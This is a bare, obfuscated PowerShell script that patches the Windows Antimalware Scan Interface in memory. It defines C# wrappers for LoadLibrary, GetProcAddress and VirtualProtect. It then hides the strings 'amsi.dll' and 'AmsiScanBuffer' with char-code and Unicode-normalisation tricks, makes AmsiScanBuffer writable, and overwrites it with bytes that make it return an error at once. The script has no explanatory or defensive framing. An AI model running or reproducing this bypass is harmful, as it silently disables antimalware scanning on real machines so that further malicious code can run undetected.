$xY_9VzElnlJ2hnj = @"
using System;
using System.Runtime.InteropServices;
public class xY_9VzElnlJ2hnj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr jtUr_UPCy, string UVM_MsfH);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr LBJXmzJubw1tFmCxtNPT, UIntPtr j0ew_vvP2hAmu, uint egE2JaQcf2iMFiXC, out uint GauhfqgRl6MxgZ31FrZ);
}
"@

Add-Type $xY_9VzElnlJ2hnj

$RSgekOJoO4HXgKl = [xY_9VzElnlJ2hnj]::LoadLibrary("$([chaR]([Byte]0x61)+[cHaR]([bYtE]0x6d)+[CHAR]([BYTe]0x73)+[CHAR]([bYTe]0x69)+[cHaR](46+17-17)+[cHAR]([byTE]0x64)+[chAR]([byTE]0x6c)+[chaR](108))")
$mYbyn9c0gyDvKAfe5c3 = [xY_9VzElnlJ2hnj]::GetProcAddress($RSgekOJoO4HXgKl, "$(('ÃmsíScã'+'nBùffér').NORMALizE([cHar](70*58/58)+[CHar](111*71/71)+[ChAr](114*67/67)+[cHar](33+76)+[ChAR]([bYtE]0x44)) -replace [cHAr]([bYtE]0x5c)+[ChAR]([bYTe]0x70)+[CHaR](123+62-62)+[CHaR]([bytE]0x4d)+[char](110+20-20)+[CHaR](125*42/42))")
$p = 0
[xY_9VzElnlJ2hnj]::VirtualProtect($mYbyn9c0gyDvKAfe5c3, [uint32]5, 0x40, [ref]$p)
$vHWnmGzwc = "0xB8"
$SHBA_fq = "0x57"
$vcKSyE6uK3YHyu_rAaF = "0x00"
$lHtKRxga2pa7WLn = "0x07"
$shaglCb2U5bP = "0x80"
$QmaElkYK = "0xC3"
$WyL2W7KVs = [Byte[]] ($vHWnmGzwc,$SHBA_fq,$vcKSyE6uK3YHyu_rAaF,$lHtKRxga2pa7WLn,+$shaglCb2U5bP,+$QmaElkYK)
[System.Runtime.InteropServices.Marshal]::Copy($WyL2W7KVs, 0, $mYbyn9c0gyDvKAfe5c3, 6)